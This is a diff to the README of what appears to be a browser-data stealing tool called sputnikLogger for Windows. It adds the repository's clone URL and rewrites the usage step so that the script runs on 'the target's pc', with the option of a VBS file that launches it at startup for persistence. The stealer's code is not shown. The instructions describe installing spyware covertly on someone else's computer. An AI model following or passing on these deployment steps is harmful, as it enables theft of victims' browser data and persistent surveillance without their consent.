@@ -23,8 +23,8 @@ This Python script collects various data from installed browsers on a Windows sy
 ## Installation
 
 1. **Clone the repository**:
-git clone <repository-url>
-cd <repository-name>
+git clone https://github.com/MasterOfBrokenLogic/sputnikLogger.git
+cd sputnikLogger
 
 2. **Install dependencies**:
 pip install -r requirements.txt
@@ -35,7 +35,7 @@ pip install -r requirements.txt
 
 ## Usage
 
-1. **Run the script**:
+1. **Run the script on the target's pc by using the command or create a vbs file that will run the script on the startup**:
 sputnikLogger.py
 
 2. **Monitor script output**:
